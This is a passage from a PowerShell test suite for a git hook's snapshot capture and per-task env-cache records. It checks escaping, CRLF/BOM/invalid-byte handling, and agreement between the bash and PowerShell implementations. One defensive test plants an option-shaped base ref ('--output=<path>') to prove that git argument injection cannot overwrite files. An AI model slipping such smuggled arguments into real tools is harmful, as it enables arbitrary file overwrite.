# --- 21cc: a base owned by ANOTHER task is refused, and [] is written ---
$g21cc = New-CaptureRepo -Name 'g21-refuse'
$g21ccBase = (& git -C $g21cc rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21cc 'seed.txt') -Value 'edited' -Encoding UTF8
Set-Content -Path (Join-Path $g21cc '.stride-env-cache') `
    -Value "TASK_ID=99`nTASK_BASE_REF=$g21ccBase`nTASK_BASE_REF_OWNER=55" -Encoding UTF8
$r21cc = Invoke-CaptureRun -Dir $g21cc -TaskId '99'
Assert-Eq "21cc: a foreign-owned base yields an empty snapshot, not another task's diff" "[]" `
    ((Get-Content -Raw -Path (Join-Path $g21cc '.stride-changed-files.json')).Trim())
Assert-Contains "21cc: and the refusal is announced" "REFUSING" ($r21cc.Stdout + $r21cc.Stderr)

# --- 21dd: an option-shaped TASK_BASE_REF must not become a git OPTION ---
# A base ref is a REVISION, so `--` cannot protect it. `--output=<path>` is
# opened for writing by git during option PARSING, so an unguarded
# `git diff --name-only <base> HEAD` truncates that file and writes the repo's
# changed-file NAMES into it — an arbitrary-file overwrite, above the project
# root, whose content is chosen by what is in the tree. TASK_BASE_REF comes from
# .stride-env-cache, which is loaded with no validation, so a repository that
# ships that file supplies the value.
$g21dd = New-CaptureRepo -Name 'g21-optionbase'
$g21ddVictim = Join-Path $TmpDir 'g21-victim.txt'
Set-Content -Path $g21ddVictim -Value 'PRECIOUS CONTENT MUST SURVIVE' -Encoding UTF8 -NoNewline
$g21ddBefore = Get-Content -Raw -Path $g21ddVictim
Set-Content -Path (Join-Path $g21dd 'seed.txt') -Value 'edited' -Encoding UTF8
Set-Content -Path (Join-Path $g21dd '.stride-env-cache') `
    -Value "TASK_ID=42`nTASK_BASE_REF=--output=$g21ddVictim" -Encoding UTF8
$null = Invoke-CaptureRun -Dir $g21dd
Assert-Eq "21dd: an option-shaped TASK_BASE_REF does not overwrite a file outside the repo" `
    $g21ddBefore (Get-Content -Raw -Path $g21ddVictim)
Assert-Eq "21dd: and the capture still produces a well-formed snapshot" "True" `
    "$((Test-Path (Join-Path $g21dd '.stride-changed-files.json')))"

}

# ============================================================
# Test Group 22: W2101 — the per-task record layer
# ============================================================
# Counterparts to the bash suite's Test Group 23 (D226 per-task snapshot base
# isolation), plus the constraint proofs this port needs and bash does not.
#
# HARNESS: these are the suite's first true unit tests, and getting there needs
# a trick. Dot-sourcing stride-hook.ps1 is impossible — its `exit 0` would
# terminate the SUITE, not a child. Re-implementing the functions as test-local
# mirrors (Group 21's approach for pure logic) is unacceptable here: a mirror of
# the escaper proves nothing about the escaping the hook actually performs, and
# escaping is the whole security property. So the functions are extracted from
# the real file by AST and dot-sourced individually — the tests bind to the
# shipped text.
Write-Host ""
Write-Host "=== Test Group 22: W2101 per-task record layer ==="

$g22Want = @(
    'ConvertTo-ShSingleQuoted', 'Get-TaskRecordKey', 'Get-TaskBaseRefKey', 'Get-TaskHeadRefKey',
    'Get-TaskOwnedKey', 'Get-TaskBaseAtKey', 'Get-TaskNarrowedKey', 'Get-EnvCacheLine',
    'Split-EnvCacheRecord', 'Read-TaskRecord',
    'Get-TaskOwnedRecord', 'Get-TaskBaseAtRecord', 'Get-TaskNarrowedRecord',
    'Get-TaskBaseRefFor', 'Get-TaskHeadRefFor', 'Set-TaskRecord', 'Set-TaskOwnedRecord',
    'Set-TaskNarrowedRecord', 'Set-TaskHeadRefRecord', 'Set-TaskBaseAtRecord',
    'Write-EnvCache', 'ConvertTo-PrintableForLog',
    'ConvertTo-CacheByteString', 'ConvertFrom-CacheByteString',
    'Get-EnvCacheRawByte', 'Test-EnvCacheUnchanged',
    # (D289) Set-TaskRecord's compare-and-swap retry moved into this shared
    # helper, so it is a dependency of the record layer now. The harness count
    # below is derived from this list, so adding a name here is the whole edit.
    'Invoke-EnvCacheRewrite'
)
$g22Ast = [System.Management.Automation.Language.Parser]::ParseFile($HookScript, [ref]$null, [ref]$null)
$g22Fns = $g22Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
$g22Found = @()
foreach ($f in $g22Fns) {
    if ($g22Want -contains $f.Name) {
        $g22Found += $f.Name
        . ([scriptblock]::Create($f.Extent.Text))
    }
}
# A silently-missing extraction would make every case below pass vacuously —
# the same "a vacuous scan is not a pass" principle the 5.1 gate applies.
$g22Missing = @($g22Want | Where-Object { $g22Found -notcontains $_ })
if ($g22Missing.Count -gt 0) {
    Write-Host "  FAIL: 22-harness: could not extract from stride-hook.ps1: $($g22Missing -join ', ')" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 22-harness: all $($g22Want.Count) record-layer functions extracted from the real hook" -ForegroundColor Green
    $script:PASS++

$g22Bash = Get-Command bash -ErrorAction SilentlyContinue
$g22Sh = Join-Path $ScriptDir 'stride-hook.sh'

function New-RecordFixture {
    param([string]$Name)
    $d = Join-Path $TmpDir "g22-$Name"
    New-Item -ItemType Directory -Path $d -Force | Out-Null
    $script:ProjectDir = $d
    $script:EnvCache = Join-Path $d '.stride-env-cache'
    return $d
}

# --- 22a: key format byte-identity across all five families ---
$null = New-RecordFixture -Name 'keys'
$g22Keys = @(
    (Get-TaskBaseRefKey  -TaskId '42'),
    (Get-TaskHeadRefKey  -TaskId '42'),
    (Get-TaskOwnedKey    -TaskId '42'),
    (Get-TaskBaseAtKey   -TaskId '42'),
    (Get-TaskNarrowedKey -TaskId '42')
) -join ' '
Assert-Eq "22a: all five key builders produce the bash key format" `
    "TASK_BASE_REF_42 TASK_HEAD_REF_42 TASK_OWNED_42 TASK_BASE_AT_42 TASK_NARROWED_42" $g22Keys

# --- 22b: the collision loop — no two ids differing only in punctuation share a record ---
$g22Collide = 0
foreach ($bad in @('42-x', '42.x')) {
    foreach ($k in @((Get-TaskBaseRefKey -TaskId $bad), (Get-TaskHeadRefKey -TaskId $bad),
                     (Get-TaskOwnedKey -TaskId $bad), (Get-TaskBaseAtKey -TaskId $bad),
                     (Get-TaskNarrowedKey -TaskId $bad))) {
        if ($k -ne '') { $g22Collide++ }
    }
}
Assert-Eq "22b: a punctuated id yields no key in any of the five families" "0" "$g22Collide"

# --- 22c: reserved suffixes, non-digits, and a long id ---
$g22Reserved = 0
# "42`n" is in this list deliberately: .NET's $ ALSO matches before a trailing
# newline, so an unanchored gate would pass it and build a key bash refuses to
# build — a silent cross-executor divergence in the one function whose job is
# byte-for-byte fidelity. \z is what closes it, and this probe pins it.
foreach ($bad in @('TRUSTED', 'OWNER', 'UNPROVEN', './-', '10_0', '', 'abc', "42`n", "42`r`n")) {
    if ((Get-TaskRecordKey -Prefix 'TASK_OWNED_' -TaskId $bad) -ne '') { $g22Reserved++ }
}
Assert-Eq "22c: reserved words and non-digit ids are all refused" "0" "$g22Reserved"
Assert-Eq "22c: a long digits-only id is accepted verbatim" `
    "TASK_BASE_REF_00000000000000000000000000000042" (Get-TaskBaseRefKey -TaskId '00000000000000000000000000000042')

# --- 22d: ConvertTo-ShSingleQuoted vs bash's sq_escape, byte for byte ---
if ($g22Bash) {
    $g22Vals = @('', 'yes', "a'b", "'", 'a\b', 'a$b', 'a`b', '__stride_no_own_commits__', 'OVERFLOW', 'abc..def,ghi')
    $g22Mismatch = @()
    foreach ($v in $g22Vals) {
        $ps = ConvertTo-ShSingleQuoted -Value $v
        $sh = (& bash -c '. "$1" > /dev/null 2>&1; sq_escape "$2"' _ $g22Sh $v 2>$null | Out-String).TrimEnd("`r", "`n")
        if ($ps -ne $sh) { $g22Mismatch += "[$v] ps=$ps sh=$sh" }
    }
    Assert-Eq "22d: the escaper is byte-identical to bash sq_escape for every probe" "0" "$($g22Mismatch.Count)"
    if ($g22Mismatch.Count -gt 0) { Write-Host "    $($g22Mismatch -join ' | ')" -ForegroundColor Red }
} else {
    Write-Host "  SKIP: 22d: byte-identity against sq_escape needs bash" -ForegroundColor Yellow
}

# --- 22e: round-trip through all four writable families ---
$null = New-RecordFixture -Name 'roundtrip'
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
$null = Set-TaskOwnedRecord    -TaskId '42' -Value 'yes'
$null = Set-TaskNarrowedRecord -TaskId '42' -Value 'no'
$null = Set-TaskHeadRefRecord  -TaskId '42' -Head 'deadbeef'
$null = Set-TaskBaseAtRecord   -TaskId '42' -Epoch '1700000000'
Assert-Eq "22e: TASK_OWNED round-trips" "yes" (Get-TaskOwnedRecord -TaskId '42').Value
Assert-Eq "22e: TASK_NARROWED round-trips" "no" (Get-TaskNarrowedRecord -TaskId '42').Value
Assert-Eq "22e: TASK_BASE_AT round-trips" "1700000000" (Get-TaskBaseAtRecord -TaskId '42').Value
Assert-Eq "22e: TASK_HEAD_REF is written in the quoted on-disk shape" "True" `
    "$((Get-Content -Raw -Path $script:EnvCache) -match ""(?m)^TASK_HEAD_REF_42='deadbeef'$"")"

# --- 22f: the single-quote case — the constraint-B proof ---
$null = New-RecordFixture -Name 'quote'
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
$null = Set-TaskOwnedRecord -TaskId '42' -Value "a'b"
$g22QLine = @(Get-Content -Path $script:EnvCache | Where-Object { $_ -like 'TASK_OWNED_42=*' })[0]
Assert-Eq "22f: an embedded quote is escaped exactly as sq_escape would" "TASK_OWNED_42='a'\''b'" $g22QLine
# The reader's [^']* class cannot express an escaped quote. That limitation is
# PINNED here rather than hidden: the value is unreadable to BOTH readers, and
# fail-closed is the correct direction.
Assert-Eq "22f: and the strict reader treats it as absent (documented [^']* limit)" "False" `
    "$((Get-TaskOwnedRecord -TaskId '42').Found)"
if ($g22Bash) {
    $g22Sourced = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_OWNED_42"' _ $script:EnvCache 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "22f: but the line is inert, valid shell that bash sources back exactly" "a'b" $g22Sourced
} else {
    Write-Host "  SKIP: 22f: the source-back leg needs bash" -ForegroundColor Yellow
}

# --- 22g: absent vs empty are different answers ---
$null = New-RecordFixture -Name 'absent'
Assert-Eq "22g: a missing record reads as absent" "False" "$((Get-TaskOwnedRecord -TaskId '42').Found)"
Set-Content -Path $script:EnvCache -Value "TASK_OWNED_42=''" -Encoding UTF8
$g22Empty = Get-TaskOwnedRecord -TaskId '42'
Assert-Eq "22g: an empty record is FOUND, not absent" "True" "$($g22Empty.Found)"
Assert-Eq "22g: and its value is the empty string" "" $g22Empty.Value

# --- 22h: shape rejection, including the forged continuation ---
$null = New-RecordFixture -Name 'shape'
Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
    'TASK_NARROWED_1=yes',
    'TASK_NARROWED_2="yes"',
    " TASK_NARROWED_3='yes'",
    "TASK_NARROWED_4='yes' # trailing",
    "XTASK_NARROWED_5='yes'",
    "BOARD_NAME='b",
    "TASK_NARROWED_6=yes",
    "'"
)
$g22Shape = 0
foreach ($id in @('1', '2', '3', '4', '5', '6')) {
    if ((Get-TaskNarrowedRecord -TaskId $id).Found) { $g22Shape++ }
}
Assert-Eq "22h: every malformed or forged record shape reads as absent" "0" "$g22Shape"

# --- 22h2: a CRLF-terminated record is absent, exactly as it is to bash ---
# The ps1 reader must not be more permissive than bash about what a record IS.
# Get-Content would strip the trailing CR and make this FOUND while bash's
# shape check reports ABSENT — the two executors disagreeing about the same
# bytes, which is what the no-Trim rule exists to prevent.
$null = New-RecordFixture -Name 'crlfrecord'
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_NARROWED_500='crlf'`r`nTASK_NARROWED_501='lf'`n", (New-Object System.Text.UTF8Encoding($false)))
Assert-Eq "22h2: a CRLF-terminated record reads as ABSENT, matching bash" "False" `
    "$((Get-TaskNarrowedRecord -TaskId '500').Found)"
Assert-Eq "22h2: and the LF-terminated record beside it still reads" "lf" `
    "$((Get-TaskNarrowedRecord -TaskId '501').Value)"
if ($g22Bash) {
    $g22CrlfBash = (& bash -c '. "$1" > /dev/null 2>&1; if read_task_record TASK_NARROWED_500 > /dev/null 2>&1; then printf FOUND; else printf ABSENT; fi' _ $g22Sh 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "22h2: and bash agrees it is absent" "ABSENT" $g22CrlfBash
}

# --- 22h3: the splitter itself — truncation, emptiness, and the BOM ---
# testing_strategy edge_cases[1] asks for "a truncated or partially-written cache
# file". 22h above probes malformed line SHAPES for OTHER keys; none of them
# truncates the file mid-record for the key actually being read, and none covers
# the zero-byte case. These do, against Get-EnvCacheLine directly — the one
# splitter both the reader and the writer now go through, so a regression in
# either shows up here rather than only in whichever of the two was edited.
$null = New-RecordFixture -Name 'truncated'

# A zero-byte cache is not one empty line. If the trailing-terminator drop
# returned @('') here, every caller would iterate a phantom record.
[System.IO.File]::WriteAllBytes($script:EnvCache, @())
Assert-Eq "22h3: a zero-byte cache yields no lines at all" "0" "$(@(Get-EnvCacheLine).Count)"
Assert-Eq "22h3: and a read over it is absent, not an error" "False" `
    "$((Get-TaskNarrowedRecord -TaskId '42').Found)"

# A newline-only cache is the same answer by a different route.
[System.IO.File]::WriteAllText($script:EnvCache, "`n", (New-Object System.Text.UTF8Encoding($false)))
Assert-Eq "22h3: a newline-only cache yields one EMPTY line, not a record" "1" "$(@(Get-EnvCacheLine).Count)"

# Truncated mid-record, for the key being read: the shape check must reject the
# partial line rather than return the half value it can see.
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_NARROWED_600='ye", (New-Object System.Text.UTF8Encoding($false)))
Assert-Eq "22h3: a record truncated mid-value reads as ABSENT" "False" `
    "$((Get-TaskNarrowedRecord -TaskId '600').Found)"
# Truncated with the terminator present but the closing quote gone.
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_NARROWED_601='yes`n", (New-Object System.Text.UTF8Encoding($false)))
Assert-Eq "22h3: a record truncated before its closing quote reads as ABSENT" "False" `
    "$((Get-TaskNarrowedRecord -TaskId '601').Found)"
# An unterminated FINAL line is not truncation — it is a whole record that simply
# lacks its LF, and both executors read it.
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_NARROWED_602='yes'", (New-Object System.Text.UTF8Encoding($false)))
Assert-Eq "22h3: an unterminated final line is still a record" "yes" `
    "$((Get-TaskNarrowedRecord -TaskId '602').Value)"

# The BOM leg: a cache written by a pre-fix ps1 under Windows PowerShell 5.1
# carries EF BB BF. bash's ^KEY= sees those bytes and reports ABSENT; if the
# splitter let .NET eat the BOM, the ps1 would report FOUND and the two
# executors would disagree about the FIRST line of every legacy cache.
$g22BomBytes = [byte[]](0xEF, 0xBB, 0xBF) + [System.Text.Encoding]::UTF8.GetBytes("TASK_NARROWED_603='yes'`nTASK_NARROWED_604='yes'`n")
[System.IO.File]::WriteAllBytes($script:EnvCache, $g22BomBytes)
Assert-Eq "22h3: a BOM-prefixed FIRST record reads as ABSENT, matching bash" "False" `
    "$((Get-TaskNarrowedRecord -TaskId '603').Found)"
Assert-Eq "22h3: and the second line, past the BOM, still reads" "yes" `
    "$((Get-TaskNarrowedRecord -TaskId '604').Value)"
if ($g22Bash) {
    $g22BomBash = (& bash -c '. "$1" > /dev/null 2>&1; if read_task_record TASK_NARROWED_603 > /dev/null 2>&1; then printf FOUND; else printf ABSENT; fi' _ $g22Sh 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "22h3: and bash agrees the BOM line is absent" "ABSENT" $g22BomBash
} else {
    Write-Host "  SKIP: 22h3: the bash-agrees leg needs bash" -ForegroundColor Yellow
}

# --- 22h4: the WRITER goes through the same splitter as the reader ---
# Before W2101's fix the writer read with Get-Content, which re-terminates a
# CRLF line as LF. A CRLF record that both executors correctly call ABSENT
# (22h2) was therefore PROMOTED to a real record by any unrelated write — the
# forged continuation the claim-branch comment warns about. Pin both halves.
$null = New-RecordFixture -Name 'writersplit'
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_NARROWED_700='crlf'`r`nBOARD_ID=55`n", (New-Object System.Text.UTF8Encoding($false)))
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
$null = Set-TaskNarrowedRecord -TaskId '42' -Value 'yes'
Assert-Eq "22h4: an unrelated write does not promote a CRLF line to a record" "False" `
    "$((Get-TaskNarrowedRecord -TaskId '700').Found)"
$g22WrBytes = [System.IO.File]::ReadAllBytes($script:EnvCache)
$g22WrCrs = 0
for ($i = 1; $i -lt $g22WrBytes.Length; $i++) {
    if ($g22WrBytes[$i] -eq 0x0A -and $g22WrBytes[$i - 1] -eq 0x0D) { $g22WrCrs++ }
}
Assert-Eq "22h4: the CR survives the rewrite byte-faithfully, as bash's grep -v leaves it" "1" "$g22WrCrs"
Assert-Eq "22h4: and the unrelated line is still there" "True" `
    "$(@(Get-EnvCacheLine | Where-Object { $_ -eq 'BOARD_ID=55' }).Count -eq 1)"
# Writing the SAME key as a CRLF-terminated line drops it, exactly as bash's
# prefix-matching `grep -v '^KEY='` does.
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_NARROWED_42='crlf'`r`n", (New-Object System.Text.UTF8Encoding($false)))
$null = Set-TaskNarrowedRecord -TaskId '42' -Value 'fresh'
Assert-Eq "22h4: a CRLF line for the SAME key is dropped by the write, as grep -v drops it" "1" `
    "$(@(Get-EnvCacheLine | Where-Object { $_ -like 'TASK_NARROWED_42=*' }).Count)"
Assert-Eq "22h4: and the surviving record is the freshly written one" "fresh" `
    "$((Get-TaskNarrowedRecord -TaskId '42').Value)"

# --- 22h5: the two seams the round-4 security review named ---
# (a) The shape check anchors with \z, not $. .NET's $ also matches immediately
# before a trailing newline, so an embedded-LF record would pass a $-anchored
# check. It is unreachable through Get-EnvCacheLine, which yields LF-free lines
# — so this asserts against Read-TaskRecord's regex directly, over a value the
# splitter cannot produce, to prove the reader is self-contained rather than
# relying on an invariant held one function away.
$null = New-RecordFixture -Name 'anchors'
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_NARROWED_800='yes'`nEVIL`n", (New-Object System.Text.UTF8Encoding($false)))
Assert-Eq "22h5: a well-formed record followed by another line still reads" "yes" `
    "$((Get-TaskNarrowedRecord -TaskId '800').Value)"
$g22Anchor = New-Object System.Text.RegularExpressions.Regex ("^TASK_NARROWED_801='([^']*)'\z")
Assert-Eq "22h5: the \z anchor rejects a trailing newline where `$ would accept it" "False" `
    "$($g22Anchor.IsMatch("TASK_NARROWED_801='yes'`n"))"
Assert-Eq "22h5: and still accepts the clean record" "True" `
    "$($g22Anchor.IsMatch("TASK_NARROWED_801='yes'"))"

# (b) (D281) A write re-emits every record it was not asked to touch as its
# ORIGINAL bytes. This used to be the documented limit of the byte-faithfulness
# claim and was pinned here as KNOWN LIMIT (D281): the decoder's invalid-byte
# fallback is replacement, so a non-UTF-8 byte in an UNRELATED line was
# destroyed by any Set-TaskRecord rewrite while bash's byte-oriented `grep -v`
# left it alone. D281 closed it with a Latin-1 storage projection, which is
# bijective over 0x00-0xFF, so the read/write pair is lossless for ALL bytes.
$null = New-RecordFixture -Name 'invalidutf8'
$g22RawBytes = [System.Text.Encoding]::UTF8.GetBytes("BOARD_NAME=caf") + [byte[]](0xE9) + [System.Text.Encoding]::UTF8.GetBytes("`n")
[System.IO.File]::WriteAllBytes($script:EnvCache, $g22RawBytes)
# FIXTURE GUARD, before the write: without it every assertion below could pass
# on a file that never contained the byte in the first place.
$g22PreE9 = $false
foreach ($b in [System.IO.File]::ReadAllBytes($script:EnvCache)) { if ($b -eq 0xE9) { $g22PreE9 = $true } }
Assert-Eq "22h5 (D281): the fixture really contains the invalid byte before the write" "True" "$g22PreE9"
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
$null = Set-TaskNarrowedRecord -TaskId '42' -Value 'yes'
$g22AfterBytes = [System.IO.File]::ReadAllBytes($script:EnvCache)
$g22HasE9 = $false
foreach ($b in $g22AfterBytes) { if ($b -eq 0xE9) { $g22HasE9 = $true } }
Assert-Eq "22h5 (D281): a lone invalid byte in an UNRELATED record survives a rewrite" "True" "$g22HasE9"
# Not merely 'an E9 exists somewhere' — a byte-count assertion would pass if the
# write relocated it into a different record. Assert the exact subsequence.
$g22Want59 = [System.Text.Encoding]::ASCII.GetBytes("BOARD_NAME=caf") + [byte[]](0xE9)
$g22FoundSeq = $false
for ($i = 0; $i -le ($g22AfterBytes.Length - $g22Want59.Length); $i++) {
    $m = $true
    for ($j = 0; $j -lt $g22Want59.Length; $j++) { if ($g22AfterBytes[$i + $j] -ne $g22Want59[$j]) { $m = $false; break } }
    if ($m) { $g22FoundSeq = $true; break }
}
Assert-Eq "22h5 (D281): and it survives in its own record, not relocated" "True" "$g22FoundSeq"
# No U+FFFD replacement was written (EF BF BD) — the old lossy behaviour.
$g22HasFffd = $false
for ($i = 0; $i -le ($g22AfterBytes.Length - 3); $i++) {
    if ($g22AfterBytes[$i] -eq 0xEF -and $g22AfterBytes[$i+1] -eq 0xBF -and $g22AfterBytes[$i+2] -eq 0xBD) { $g22HasFffd = $true; break }
}
Assert-Eq "22h5 (D281): no U+FFFD replacement was written" "False" "$g22HasFffd"
Assert-Eq "22h5: and the record written alongside it is intact" "yes" `
    "$((Get-TaskNarrowedRecord -TaskId '42').Value)"

# --- 22h6 (D281): the rest of the invalid-byte class, and the writer guard ---
# 22h6b: not just a lone high byte. Each of these is a distinct way to be
# invalid UTF-8, and the replacement fallback collapsed them all identically.
$null = New-RecordFixture -Name 'invalidclass'
$g22Seqs = @{
    'lone FF'            = [byte[]](0xFF)
    'truncated lead C3'  = [byte[]](0xC3)
    'overlong C0 80'     = [byte[]](0xC0, 0x80)
    'lone surrogate'     = [byte[]](0xED, 0xA0, 0x80)
}
foreach ($name in ($g22Seqs.Keys | Sort-Object)) {
    $seq = $g22Seqs[$name]
    $pre = [System.Text.Encoding]::ASCII.GetBytes("BOARD_NAME=x") + $seq + [byte[]](0x0A)
    [System.IO.File]::WriteAllBytes($script:EnvCache, $pre)
    $null = Set-TaskNarrowedRecord -TaskId '77' -Value 'ok'
    $post = [System.IO.File]::ReadAllBytes($script:EnvCache)
    $found = $false
    for ($i = 0; $i -le ($post.Length - $seq.Length); $i++) {
        $m = $true
        for ($j = 0; $j -lt $seq.Length; $j++) { if ($post[$i + $j] -ne $seq[$j]) { $m = $false; break } }
        if ($m) { $found = $true; break }
    }
    Assert-Eq "22h6b (D281): '$name' in an unrelated record survives a rewrite" "True" "$found"
}

# 22h6f: the writer guard. A line carrying a character above U+00FF was never
# converted at its IN boundary, and Latin-1 would silently encode it as '?'
# (0x3F). Write-EnvCache must refuse rather than write a corrupted cache, and
# must leave the previous cache byte-identical — the contract it already keeps
# on every other failure. Auto-repair is deliberately NOT the behaviour: 'all
# chars <= U+00FF' cannot tell a converted byte-string from an unconverted
# 'café', so repairing would corrupt the legitimate case.
$null = New-RecordFixture -Name 'guard'
$g22GuardPre = [System.Text.Encoding]::ASCII.GetBytes("BOARD_ID=55`n")
[System.IO.File]::WriteAllBytes($script:EnvCache, $g22GuardPre)
Assert-Eq "22h6f (D281): the guard fixture starts non-empty, so 'unchanged' is a real claim" "True" `
    "$([System.IO.File]::ReadAllBytes($script:EnvCache).Length -gt 0)"
$g22GuardRc = Write-EnvCache -Lines @("BOARD_NAME='ok'", ("TASK_TITLE='" + [string][char]0x2705 + "'"))
Assert-Eq "22h6f (D281): Write-EnvCache refuses a line holding a char above U+00FF" "False" "$g22GuardRc"
$g22GuardPost = [System.IO.File]::ReadAllBytes($script:EnvCache)
$g22GuardSame = $g22GuardPost.Length -eq $g22GuardPre.Length
if ($g22GuardSame) { for ($i = 0; $i -lt $g22GuardPre.Length; $i++) { if ($g22GuardPre[$i] -ne $g22GuardPost[$i]) { $g22GuardSame = $false } } }
Assert-Eq "22h6f (D281): and the previous cache is left byte-identical" "True" "$g22GuardSame"

# --- 22h6c (D281): ONE shared cache, BOTH executors, criterion 5 ---
# Every D281 divergence is invisible to a suite that only asks one executor, so
# this drives the round trip that actually matters in a mixed checkout: BASH
# writes a cache carrying an invalid byte, the PS1 rewrites an unrelated record,
# and bash must still read back exactly what it wrote. Before D281 the ps1's
# rewrite destroyed the byte and the two executors then disagreed about what the
# same file said.
if ($g22Bash) {
    $null = New-RecordFixture -Name 'crossexec'
    # The cache is seeded by bash with a plain printf redirect, not through
    # write_env_cache — stated exactly, because an earlier version of this
    # comment claimed the shipped bash WRITER was exercised and it is not. The
    # half that is genuinely the shipped mechanism is the READ: `. "$ENV_CACHE"`
    # is bash's real loader, and that is the side this case is about.
    $g22CrossSeed = @'
set -u
. "$1" > /dev/null 2>&1 || true
PROJECT_DIR="$2"
ENV_CACHE="$2/.stride-env-cache"
printf "BOARD_NAME=caf\351\nTASK_OWNED_9='keep'\n" > "$ENV_CACHE"
'@
    $g22CrossSh = Join-Path $script:ProjectDir 'seed.sh'
    [System.IO.File]::WriteAllText($g22CrossSh, $g22CrossSeed, (New-Object System.Text.UTF8Encoding($false)))
    & bash $g22CrossSh $g22Sh $script:ProjectDir 2>$null | Out-Null

    $g22CrossPre = [System.IO.File]::ReadAllBytes($script:EnvCache)
    $g22CrossPreHasE9 = $false
    foreach ($b in $g22CrossPre) { if ($b -eq 0xE9) { $g22CrossPreHasE9 = $true } }
    # Fixture guard: if bash did not write the byte, everything below is vacuous.
    Assert-Eq "22h6c (D281): the bash-seeded cache really contains the invalid byte" "True" "$g22CrossPreHasE9"

    # bash's reading of the record, before and after, captured to FILES and
    # compared as BYTES. Comparing two console-decoded strings cannot fail on
    # the regression this case exists for: pre-fix the bytes differ (caf<E9>
    # becomes caf<EF BF BD>) but on a UTF-8 console BOTH decode to the same
    # "caf\uFFFD", so the assertion is green either way — and green on an empty
    # capture too, since "" equals "". Bytes are the only form that fails.
    $g22CrossOutA = Join-Path $script:ProjectDir 'read-before.out'
    $g22CrossOutB = Join-Path $script:ProjectDir 'read-after.out'
    & bash -c '. "$1" > /dev/null 2>&1; printf %s "$BOARD_NAME" > "$2"' _ $script:EnvCache $g22CrossOutA 2>$null | Out-Null

    # The ps1 rewrites an UNRELATED record.
    $null = Set-TaskNarrowedRecord -TaskId '9' -Value 'fresh'

    & bash -c '. "$1" > /dev/null 2>&1; printf %s "$BOARD_NAME" > "$2"' _ $script:EnvCache $g22CrossOutB 2>$null | Out-Null
    $g22BeforeBytes = if (Test-Path $g22CrossOutA) { [System.IO.File]::ReadAllBytes($g22CrossOutA) } else { [byte[]]@() }
    $g22AfterBytes2 = if (Test-Path $g22CrossOutB) { [System.IO.File]::ReadAllBytes($g22CrossOutB) } else { [byte[]]@() }
    # Non-vacuity: an empty capture on both sides would compare equal.
    Assert-Eq "22h6c (D281): bash's pre-write read is non-empty, so the comparison is not vacuous" "True" `
        "$($g22BeforeBytes.Length -gt 0)"
    $g22CrossSame = $g22BeforeBytes.Length -eq $g22AfterBytes2.Length
    if ($g22CrossSame) { for ($i = 0; $i -lt $g22BeforeBytes.Length; $i++) { if ($g22BeforeBytes[$i] -ne $g22AfterBytes2[$i]) { $g22CrossSame = $false; break } } }
    Assert-Eq "22h6c (D281): bash reads identical BYTES before and after an unrelated ps1 write" "True" "$g22CrossSame"
    # And the record the ps1 was actually asked to write landed.
    Assert-Eq "22h6c (D281): the ps1's own write took effect on the shared cache" "fresh" `
        "$((Get-TaskNarrowedRecord -TaskId '9').Value)"
    # The unrelated record bash wrote is still present to the ps1 reader too —
    # criterion 4, present to one executor means present to the other.
    Assert-Eq "22h6c (D281): and the record bash wrote is still present to the ps1 reader" "keep" `
        "$((Get-TaskOwnedRecord -TaskId '9').Value)"
} else {
    Write-Host "  SKIP: 22h6c (D281): the cross-executor shared-cache case needs bash" -ForegroundColor Yellow
}

# --- 22i: last well-formed match wins ---
$null = New-RecordFixture -Name 'lastwins'
Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @("TASK_OWNED_42='first'", "TASK_OWNED_42='second'")
Assert-Eq "22i: the last well-formed record wins" "second" (Get-TaskOwnedRecord -TaskId '42').Value

# --- 22j: writer dedupes and appends last, preserving unrelated lines ---
$null = New-RecordFixture -Name 'dedupe'
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @('BOARD_ID=55', 'TASK_OWNED_42=malformed', 'BOARD_NAME=x')
$null = Set-TaskOwnedRecord -TaskId '42' -Value 'yes'
$g22Lines = @(Get-Content -Path $script:EnvCache)
Assert-Eq "22j: exactly one line survives for the key" "1" "$(@($g22Lines | Where-Object { $_ -like 'TASK_OWNED_42=*' }).Count)"
Assert-Eq "22j: and it is the LAST line, so last-match-wins means newest" "TASK_OWNED_42='yes'" $g22Lines[-1]
Assert-Eq "22j: unrelated lines are preserved in order" "BOARD_ID=55 BOARD_NAME=x" `
    (($g22Lines | Where-Object { $_ -like 'BOARD_*' }) -join ' ')

# --- 22k: the orphan-base guard, and which families deliberately lack it ---
$null = New-RecordFixture -Name 'orphan'
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_77', $null, 'Process')
Assert-Eq "22k: TASK_OWNED refuses to record without a base partner" "False" `
    "$(Set-TaskOwnedRecord -TaskId '77' -Value 'yes')"
Assert-Eq "22k: TASK_HEAD_REF refuses too" "False" `
    "$(Set-TaskHeadRefRecord -TaskId '77' -Head 'deadbeef')"
Assert-Eq "22k: TASK_NARROWED has no base guard, by design" "True" `
    "$(Set-TaskNarrowedRecord -TaskId '77' -Value 'no')"
Assert-Eq "22k: TASK_BASE_AT has no base guard either" "True" `
    "$(Set-TaskBaseAtRecord -TaskId '77' -Epoch '1700000000')"
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_77', 'abc123', 'Process')
Assert-Eq "22k: with a base present, TASK_OWNED records" "True" `
